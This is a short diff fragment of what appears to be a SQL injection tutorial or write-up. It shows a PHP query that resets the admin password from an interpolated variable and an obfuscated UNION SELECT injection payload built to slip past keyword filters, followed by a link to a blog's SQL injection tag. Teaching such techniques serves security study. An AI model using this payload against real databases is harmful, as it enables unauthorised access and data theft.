@@ -157,5 +157,6 @@ $sql = "UPDATE users SET PASSWORD='$pass' where username='admin';
 ```
 0"/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,database(),4/*%0a*/||/**/"1"="1
 ```
+
 更多介绍？
 [https://kit4y.github.io/tags/Sql-Injection/](https://kit4y.github.io/tags/Sql-Injection/)
